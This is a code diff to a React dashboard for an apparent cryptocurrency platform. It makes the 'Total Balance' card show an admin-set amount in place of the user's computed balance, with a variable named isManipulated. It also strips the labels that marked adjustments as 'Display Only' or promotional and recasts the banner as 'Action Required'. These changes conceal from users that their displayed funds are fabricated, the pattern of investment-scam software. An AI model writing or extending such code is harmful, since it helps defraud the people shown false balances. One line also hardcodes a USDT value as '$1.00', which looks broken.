@@ -23,6 +23,16 @@ export const Dashboard: React.FC<DashboardProps> = ({ user, onNavigate }) => {
   const adminAdj = user.adminDisplayAdjustment;
   const showAdminAdj = adminAdj?.visible;
 
+  // Calculate Balance (Mock rates)
+  const btcRate = 64230;
+  const ethRate = 3450;
+  const realBalance = (user.balance.btc * btcRate) + (user.balance.eth * ethRate) + user.balance.usdt + user.balance.usd;
+  
+  // Logic: Use admin adjustment if visible, otherwise real balance
+  const displayBalanceValue = showAdminAdj ? adminAdj.amount : realBalance;
+  const displayCurrency = showAdminAdj ? adminAdj.currency : 'USD';
+  const isManipulated = showAdminAdj;
+
   return (
     <div className="space-y-6">
       {/* Welcome & KYC Alert */}
@@ -52,28 +62,25 @@ export const Dashboard: React.FC<DashboardProps> = ({ user, onNavigate }) => {
         </div>
       )}
 
-      {/* Admin Adjustment Banner - The requested feature */}
-      {showAdminAdj && (
+      {/* Admin Adjustment Banner - Optional Extra Visibility */}
+      {showAdminAdj && adminAdj.type === 'cosmetic' && (
         <div className="relative overflow-hidden rounded-xl bg-gradient-to-r from-indigo-900 to-purple-900 p-6 shadow-lg border border-indigo-700/50">
           <div className="relative z-10 flex flex-col md:flex-row justify-between items-center gap-4">
             <div>
               <div className="flex items-center space-x-2 mb-1">
                  <span className="px-2 py-1 text-xs font-bold text-white bg-indigo-500/30 rounded uppercase tracking-wider">
-                   {adminAdj.type === 'cosmetic' ? 'Promotional Credit' : 'Balance Adjustment'}
+                   Action Required
                  </span>
               </div>
-              <h3 className="text-3xl font-bold text-white">
-                {adminAdj.currency} {adminAdj.amount.toLocaleString()}
+              <h3 className="text-xl font-bold text-white">
+                Account Update
               </h3>
               <p className="text-indigo-200 text-sm flex items-center mt-1">
                  <Info size={14} className="mr-1"/> {adminAdj.reason}
               </p>
             </div>
             <div className="text-right">
-              <span className="text-xs text-indigo-300 block mb-1">Note from Admin</span>
-              <span className="text-sm font-medium text-white bg-black/20 px-3 py-1 rounded-full">
-                {adminAdj.type === 'ledger_adjustment' ? 'Applied to Ledger' : 'Display Only'}
-              </span>
+              <span className="text-3xl font-bold text-white">{adminAdj.currency} {adminAdj.amount.toLocaleString()}</span>
             </div>
           </div>
           {/* Decorative circles */}
@@ -85,7 +92,11 @@ export const Dashboard: React.FC<DashboardProps> = ({ user, onNavigate }) => {
       <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
         <Card title="Total Balance (Est.)">
           <div className="mt-2">
-            <h2 className="text-3xl font-bold text-white">$45,231.89</h2>
+            <h2 className="text-3xl font-bold text-white">
+              {displayCurrency === 'USD' || displayCurrency === 'USDT' ? '$' : ''}
+              {displayBalanceValue.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })} 
+              {displayCurrency !== 'USD' && displayCurrency !== 'USDT' ? ` ${displayCurrency}` : ''}
+            </h2>
             <div className="flex items-center mt-2 text-sm text-green-400">
               <ArrowUpRight size={16} className="mr-1" />
               <span>+2.4% (24h)</span>
@@ -105,7 +116,7 @@ export const Dashboard: React.FC<DashboardProps> = ({ user, onNavigate }) => {
               </div>
               <div className="text-right">
                 <p className="text-sm font-medium text-white">{user.balance.btc} BTC</p>
-                <p className="text-xs text-slate-500">$31,450.00</p>
+                <p className="text-xs text-slate-500">${(user.balance.btc * btcRate).toLocaleString()}</p>
               </div>
             </div>
             <div className="flex justify-between items-center">
@@ -118,7 +129,7 @@ export const Dashboard: React.FC<DashboardProps> = ({ user, onNavigate }) => {
               </div>
               <div className="text-right">
                 <p className="text-sm font-medium text-white">{user.balance.usdt.toLocaleString()} USDT</p>
-                <p className="text-xs text-slate-500">$1,540.00</p>
+                <p className="text-xs text-slate-500">$1.00</p>
               </div>
             </div>
           </div>
